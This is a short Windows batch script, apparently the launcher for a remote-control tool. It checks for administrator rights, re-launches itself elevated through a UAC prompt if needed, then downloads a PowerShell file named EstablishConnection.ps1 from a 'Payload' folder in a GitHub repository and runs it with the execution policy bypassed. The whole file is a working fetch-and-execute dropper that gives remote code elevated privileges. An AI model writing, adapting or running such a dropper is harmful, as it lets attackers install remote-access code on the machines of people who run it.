@echo off
:: Check for admin privileges
>nul 2>&1 "%SYSTEMROOT%\System32\cacls.exe" "%SYSTEMROOT%\System32\config\system"

:: If not admin, restart script as admin
if %errorlevel% neq 0 (
    echo Running script as administrator...
    goto UACPrompt
)

:: Continue running the script
powershell -command "Invoke-WebRequest -Uri 'https://github.com/ReylanTeo/IControlU/blob/d32a82143adcca323a8f82aa1bef1edab65af7da/Payload/EstablishConnection.ps1' -OutFile 'EstablishConnection.ps1'"
PowerShell -ExecutionPolicy Bypass -File ".\EstablishConnection.ps1"

:: Exit the script
exit /b

:UACPrompt
    powershell -Command "Start-Process -FilePath '%0' -Verb RunAs"
    exit /b
